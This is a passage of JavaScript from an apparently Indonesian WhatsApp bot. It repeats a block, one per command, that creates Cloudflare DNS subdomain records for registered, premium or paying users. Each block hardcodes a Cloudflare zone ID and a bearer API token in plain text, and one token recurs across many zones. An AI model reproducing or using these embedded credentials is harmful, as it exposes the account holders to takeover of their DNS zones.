                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain47': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6cbcca73a1d2eadde62edfd18d29f65d";
               let apitoken = "8hA4i28Ulod0AoDA_wuWaHiKqAPh_tZ6b4kphQbn";
               let tld = "crazyyhosting.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain48': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "449f1bcf59520d9fd10f23f467ca029b";
               let apitoken = "2YqnpPSXIsHCJbv71nmsMNv-bbU4qkYRoz8FDlQN";
               let tld = "servershop.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain49': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cacc799e17439b4757d1963ba63ff184";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "rumahpanel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain49 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain50': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "079d5f563bfc1f1c45e380adbf73fa95";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "controlpanel.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain51': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e035e2ebcaf16e84e6bdfe6d64c0b7d1";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "sellerpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain52': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8ee0b4ef93c30c1c434a02babecdf3df";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "panelstoree.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain53': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "52a4ed08947c21ff3e0f8834e2bc333b";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "toko-pannelmurah.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain54': {
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6bd18a4ab072420e148f3c0c769bd380";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "vvip-pannel.online";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
          break
          case 'domain55': {
        if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "082d880e4df98024ef1b01ba5e6ac6f0";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "Hardzoffcial-private.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
          break
          case 'domain56': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "724a897776db0b5e48f2b0b95356bda7";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "amaliasyva-private.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain57': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "00b7a88bfc1bfd5ae9a12e550ab45230";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "kangpane.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain58': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "de3a846268898e19447018bcba035001";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "rizalxalfi.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'buydomain1': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "724a897776db0b5e48f2b0b95356bda7";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "amaliasyva-private.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 10000, db_saldo)
           break
          case 'buydomain2': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 5000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp5000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e0f9412065e53bd57bde671aa36345a9";
               let apitoken = "MDVzjxiioRJ9uO8UnGuvqIIcahrstb-mjlgECNbw";
               let tld = "panelku.link";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
